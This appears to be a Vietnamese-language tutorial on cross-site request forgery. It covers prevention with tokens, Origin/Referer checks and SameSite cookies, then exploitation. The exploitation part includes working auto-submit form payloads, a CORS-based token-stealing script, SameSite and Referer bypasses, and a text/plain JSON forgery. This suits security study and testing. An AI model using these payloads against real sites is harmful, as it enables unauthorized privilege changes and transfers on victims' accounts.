# CSRF

CSRF là dạng tấn công mà attacker khiến victim thực hiện những hành động nhạy cảm một cách không chủ đích. Tấn công này thường được thực hiện bằng cách gửi liên kết của attack's websiste tới victim, nơi mà chứa payload csrf attack do attacker tạo ra. Khi victim truy cập link này, nó sẽ tự động thực thi những hành động nhạy trong vulnerability web target mà attacker đã thiết lập sẵn.

Ví dụ: khi 1 post request tại `bank.com` để nâng quyền user mà không sử dụng csrf.

```http
POST /admin.php HTTP/1.1
Host: bank.com
...

action=upgrade&username=user1
```

Attacker có thể host 1 trang `attacker.com` chứa payload csrf như sau để gửi cho victim, nếu victim có session role cùng với `samesite` phù hợp ta có thể nâng role thành công: 

```
# có thể sử dụng https://csrf-poc-generator.vercel.app/

<html>
  <body>
    <form action="https://bank.com
/admin.php" method="POST">
      <input type="hidden" name="action" value="upgrade" />
      <input type="hidden" name="username" value="user1" />
    </form>
    <script>
      document.forms[0].submit()
    </script>
  </body>
</html>
```

Một ví dụ khác tương tự như trên nhưng được được gửi qua method `GET`. Lúc này attacker có thể không cần host một trang web chứa payload csrf nữa mà có thể gửi trực tiếp vul endpoint cho victim

```html
GET /admin.php?action=upgrade&username=user1 HTTP/1.1
Host: bank.com
...

# Gửi trực tiếp /admin.php?action=upgrade&username=user1 cho victim
```

# CSRF Prevention

* **Cấu hình strict csrf token**: server tạo một token có giá trị ngẫu nhiên, đủ lớn và khó đoán. Token thường được liên kết với session của người dùng. Khi client gửi request thực hiện các hành động nhạy cảm, token cần phải được gửi kèm để server xác minh.
* **Dựa vào HTTP Headers Origin và Referer**: web application có thể check `origin` or `referer` để từ chối cross-origin request

`Origin` và `Referer` là hai HTTP request header cung cấp thông tin về nguồn khởi tạo request, giúp server xác định request có xuất phát từ một origin đáng tin cậy hay không.

- **Origin:** Chứa scheme, hostname và port của origin khởi tạo request, không bao gồm path hay query string. Header này thường xuất hiện trong các request POST, Fetch API/XMLHttpRequest và CORS preflight, nhưng không được gửi trong tất cả các request.
- **Referer:** Chứa URL của trang nguồn khởi tạo request. Tuy nhiên, thông tin này có thể bị lược bỏ hoặc giới hạn tùy thuộc vào Referrer Policy. Ví dụ, với chính sách mặc định phổ biến `strict-origin-when-cross-origin`, browser gửi đầy đủ URL đối với same-origin request, chỉ gửi origin đối với cross-origin request và không gửi Referer khi điều hướng từ HTTPS xuống HTTP.

**Cơ chế phòng chống:** Server nên kiểm tra `Origin` và `Referer` để xác minh nguồn khởi tạo các request có khả năng thay đổi trạng thái. Việc kiểm tra cần so sánh chính xác scheme, hostname và port với origin hợp lệ, thay vì chỉ tìm kiếm chuỗi con trong URL. Nếu cả hai header đều không tồn tại, server nên từ chối request hoặc áp dụng cơ chế xác minh bổ sung thay vì mặc định cho phép.
* **Samesite Cookie**: tham số này được dùng để cấu hình xem cookie có được gửi kèm theo khi thực hiện request từ cross-origin không. 

Cấu hình này phụ thuộc vào same site (không phải same origin): 2 site được gọi là same site nếu nó thỏa mãn 2 điều kiện đó là cùng `schema` và cùng `registrable domain`, không yêu cầu cùng `port` hay `subdomain`. Nếu không cùng samesite cookie sẽ được gửi kèm hay không phụ thuộc vào giá trị mà server set cho trường `samesite` này.

Value của nó có thể là 1 trong 3 giá trị sau: (mặc định nếu không set giá trị của nó là `Lax`)

* **None**: cookie được gửi kèm với tất cả cross-origin request, giá trị này luôn đi kèm với `Secure` (`SameSite=None; Secure`), vì thế cookie sẽ chỉ được gửi qua HTTPS.
* **Lax**: cookie chỉ được gửi khi cross-origin request là những `top-Level navagation GET`.
    
```html
# Ví dụ
Click vào link <a href="...">
Javascript location.href = '...'
Javascript window.location = '...'

# Các trường hợp không phải top-level navigation
Load ảnh <img src="...">
Load iframe <iframe src="...">
Javascript fetch(), XMLHttpRequest
```
* **Strict**: cookie chỉ được gửi trong các request `same-site`

Thông thường, ta sử dụng `csrf token` làm phương pháp phòng thủ chính và kết hợp với `SameSite` và `Origin, Referer Header` làm defense-in-depth protection.

# CSRF Exploitation

## Cấu hình csrf token không chính xác

* **Không triển khai csrf token**: ta có trực tiếp thực hiện tấn công csrf attack

* **Triển khai csrf token dựa vào method**: triển khai csrf trong POST request nhưng lại bỏ qua trong GET request -> chuyển qua GET và exploit như bình thường

* **Token is not tied to a user session**: trong trường hợp server chỉ check token hợp lệ mà không kiểm tra nó có thuộc về session này không, attacker có thể sử dụng `owner token` để chèn vào trường `csrf` và thực hiện tấn công như bình thường. 

* **Token tied với cookie mà không phải session cookie**: trong trường hợp này, attacker cần phải tìm cách để ghi được cookie mà tied với token vào cho victim (ví dụ qua CRLF injection)

* **Double csrf token**: đây là trường hợp csrf token được gửi qua cả trong cookie và trong query tring với GET request hoặc body request trong POST request. Backend sẽ thực hiện lấy ra csrf token trong cookie có khớp với csrf token được gửi trong request không. Với trường hợp này ta cũng cần tìm cách để ghi được cookie vào victim như trên và gửi csrf token có giá trị trùng với giá trị mà ta đã điền trong cookie

* **Weak token**: trong trường hợp token dạng dễ đoán (tăng dần, hay base64 ...) ta có thể đoán trước

## CORS Misconfigured to CSRF

Trong trường hợp cấu hình CORS không phù hợp, dù có triển khai csrf token chính xác, attacker vẫn có thể khai thác trong trường hợp này. Attacker có thể thực hiện lấy csrf token trước sau đó thực hiện csrf attack như thông thường. Ví dụ, tại origin `bank.com` lưu csrf token tại endpoint `/profile`. Và có chức năng nâng role qua POST tới `/admin.php`. Attack có thể thực hiện khai thác csrf trong trường hợp này bằng cách:

```html
<script>
    var xhr = new XMLHttpRequest();
    xhr.open('GET', 'https://bank.com/profile',false);
    xhr.withCredentials = true;
    xhr.send();
    var doc = new DOMParser().parseFromString(xhr.responseText, 'text/html');
    var csrfToken = encodeURIComponent(doc.getElementById('csrf').value);
    
    var csrf_req = new XMLHttpRequest();
    var params = `action=upgrade&csrf=${csrfToken}&username=attacker`;
    csrf_req.open('POST', 'https://bank.com/admin.php', false);
    csrf_req.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
    csrf_req.withCredentials = true;
    csrf_req.send(params);
</script>
```

## SameSite Cookie Bypass

### Lax Bypass

Khi `Samesite=Lax`, cookie vẫn được gửi đi nếu đó là request `top-level navigation GET`. Như vậy các endpoint mà sử dụng method `GET` vẫn có thể bị dính csrf attack. Ngoài ra một số trang web hỗ trợ nhiều method cho 1 request, khi test ta có thể sử change từ `POST` sang `GET` để thử xem server có hỗ trợ không. Đồng thời, 1 số server hỗ trợ rewrite method qua các param như `_method`.

Ví dụ: (cookie sử dụng `samesite=lax`)

```http
POST /transfer HTTP/1.1
Host: bank.com

amount=1000&recipient=admin
```

Ta có thể thử test với request:
```http
# chuyển qua GET
https://bank.com/transfer?amount=1000&recipient=admin

# rewrite method
https://bank.com/transfer?_method=POST&amount=1000&recipient=admin
```

### Strict Bypass

Các kỹ thuật sử dụng được trong `SameSite=Strict` cũng có thể được dùng để áp dụng cho `SameSite=Lax`

#### Bypass via client-side redirect

**Client-side redirect** là dạng redirect được chuyển hướng từ các thẻ `html` hoặc là `JS`. Khi thực hiện chuyển hướng như vậy, origin và referer sẽ là giá trị của side mà nó redirect -> lúc này được coi là `Samesite` -> cookie luôn được gửi kèm theo request. Như vậy, nếu trang web có 1 endpoint nào đó dính `client-side redirect`. Attacker có thể tận dụng điều đó để khai thác lỗ hổng CSRF.

Ví dụ: (cookie sử dụng `samesite=strict`) một trang web `bank.com` tại endpoint `/admin.php?hello=hi` được redirect qua tag `<meta>`. 

```html
...
<meta
    http-equiv="refresh"
    content="0;url=/profile.php?hello=hi"
>
...
```

và có 1 endpoint `/profile?promote=user1` dùng để nâng role user mà bị dính lỗ hổng CSRF. Trong trường hợp này ta có thể khai thác bằng cách gửi url bên dưới cho victim:

```
https://bank.com/admin.php?user=attacker&promote=attacker
```

#### Bypass via vulnerability sibling domains

Vì `Samesite` khác với `Same origin`, nó vẫn chấp nhận các subdomains. Chính vì thế nếu 1 subdomains dính các lỗ hổng như XSS, attacker có thể tận dụng XSS này để thực hiện csrf attacker.

## Header-based defense bypass

Nếu phương thức này được triển khai, ta có thể sử dụng các cách bypass tương tự như bypass domain name hay URL filters. Ví dụ: vulnerability web chỉ `http://vulnerabesite.xyz` chỉ check `vulnerabesite.xyz` có xuất hiện trong Referer header không. Lúc này, attacker có thể host payload lên trang web dạng `http://attacker.com/somepath/vulnerability.xyz`

Một trường hợp nữa, là khi server check khi tồn tại trường Referer nhưng lại omit khi mà trường này không xuất hiện. Attacker có thể ép để không gửi trường này qua tag html bên dưới và bypass thành công.

```html
<meta name="referrer" content="no-referrer">
```

**Note**: nhiều browser sẽ strip query string trong referer header, nếu bạn muốn toàn bộ url (bao gồm cả query string) nằm trong referer header hãy cấu hình attacker server trả về response chứa header `Referrer-Policy: unsafe-url` hoặc tương đương với chèn tag `<meta name="referrer" content="unsafe-url">`

## CSRF with JSON Request Body

Trường hợp request được POST với JSON data, lúc này nó đã trở thành complex request và cần được cấu hình CORS phù hợp thì request gốc mới được gửi đi. Trong trường hợp CORS cho phép thì không sao, nhưng ngược lại nếu CORS không cho phép ta có thể thử forge JSON body với content-type: text/plain:

```html
<html>
<body>
<form method="POST"
action="http://csrf.vulnerablesite.htb/profile.php" enctype="text/plain">
<input type="hidden" name='{"promote": "htb-stdnt", "dummykey'
value='": "dummyvalue"}' />
</form>
<script>
document.forms[0].submit();
</script>
</body>
</html>
```

This CSRF payload lúc này sẽ trông giống dạng:

```http
POST /profile.php HTTP/1.1
Host: csrf.vulnerabesite.htb
Content-Length: 53
Content-Type: text/plain

{"promote": "htb-stdnt", "dummykey=": "dummyvalue"}
```

Nếu backend không thực hiện check content-type, mà chỉ phụ thuộc vào syntax, attacker có thể bypass để request không gửi Preflight request.


